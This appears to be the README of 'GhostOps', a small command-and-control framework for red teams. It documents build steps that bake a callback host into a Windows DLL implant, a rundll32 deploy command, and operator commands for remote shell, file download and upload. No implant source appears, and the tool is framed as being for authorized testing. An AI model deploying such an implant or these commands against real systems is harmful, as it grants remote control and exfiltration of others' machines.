# GhostOps

A lightweight Command and Control Framework for authorized red team engagements and security research.

> **Legal notice** — For authorized security assessments and educational research only. Use against systems without explicit written permission is illegal. The authors accept no liability for misuse.

---

## Components

| | Language | Output | Role |
|---|---|---|---|
| `beacon/` | C | `beacon.dll` | Windows implant |
| `server/` | Go | `server` | C2 listener + operator API |
| `client/` | Go | `client` | Operator REPL |

---

## Prerequisites

```bash
# Cross-compiler for the beacon (Debian/Ubuntu)
sudo apt install mingw-w64

# Go 1.21+  →  https://go.dev/dl/
```

---

## Build

```bash
# Server and client
make

# Beacon — host/port baked in at compile time
make beacon BEACON_HOST=<ip> BEACON_PORT=<port>

# Example
make beacon BEACON_HOST=10.10.14.5 BEACON_PORT=8080
```

Artifacts: `build/server`, `build/client`, `build/beacon.dll`

---

## Usage

**1. Start the server**

```bash
./build/server
# Optional flags:
#   -c2-host   bind address for beacon traffic  (default 0.0.0.0)
#   -c2-port   port for beacon traffic          (default 8080)
#   -op-host   bind address for operator API    (default 127.0.0.1)
#   -op-port   port for operator API            (default 9090)
#   -log       path to log file                 (tee to stdout + file)
```

**2. Deploy the beacon** on the target (requires `BeaconMain` export)

```cmd
rundll32.exe beacon.dll,BeaconMain
```

**3. Connect with the client**

```bash
./build/client
# Optional flags:
#   -server  operator API address  (default http://127.0.0.1:9090)
```

---

## Operator commands

```
beacons                   list all active beacons
use <id>                  select a beacon
info                      show full beacon details
shell <cmd>               run a shell command
sleep <ms> [jitter%]      change sleep interval
kill                      terminate the beacon
download <remote> [local] pull a file from the target
upload <local> <remote>   push a file to the target
tasks [-a]                show task results  (-a = all, default = new only)
back                      deselect beacon
help                      show this list
exit                      quit
```

---

## Architecture

```
Operator REPL
    │
    │ HTTP :9090 (operator API)
    ▼
┌─────────────────────────────────────┐
│  server                             │
│  ├── C2 listener      :8080         │
│  │   POST /checkin                  │
│  │   GET  /tasks/<id>               │
│  │   POST /result                   │
│  └── Operator API     :9090         │
│      GET  /beacons[/<id>]           │
│      POST /task                     │
│      GET  /results/<id>             │
└─────────────────┬───────────────────┘
                  │ HTTP :8080 (C2)
                  ▼
┌─────────────────────────────────────┐
│  beacon.dll (target host)           │
│  ├── context.c   host profiling     │
│  ├── checkin.c   initial check-in   │
│  ├── loop.c      sleep / poll       │
│  ├── tasks.c     task dispatch      │
│  ├── shell.c     persistent shell   │
│  └── file.c      file transfer      │
└─────────────────────────────────────┘
```

---

## Project structure

```
.
├── beacon/
│   ├── include/beacon.h      shared types and declarations
│   └── src/
│       ├── main.c            DLL entry point
│       ├── context.c         host profiling
│       ├── checkin.c         HTTP check-in
│       ├── loop.c            sleep / poll loop
│       ├── tasks.c           task polling, JSON parsing, dispatch
│       ├── shell.c           persistent cmd.exe pipe
│       └── file.c            base64 file upload / download
├── client/
│   ├── main.go
│   └── internal/
│       ├── banner/           startup banner
│       ├── display/          terminal colour and table helpers
│       ├── models/           shared data models
│       └── repl/             REPL loop and command handlers
├── server/
│   ├── main.go               dual-listener setup
│   ├── banner/               startup banner
│   ├── handlers/
│   │   ├── c2.go             beacon-facing endpoints
│   │   └── operator.go       operator-facing endpoints
│   └── store/
│       └── store.go          beacon store, task queues, result history
├── Makefile
└── README.md
```

---

## Known limitations

- No TLS — C2 traffic is plaintext HTTP
- No operator authentication
- In-memory store only — state is lost on server restart
- No evasion (AMSI/ETW patching, sleep obfuscation, EDR unhooking, etc.)

Detection by a mature EDR or monitored network should be expected.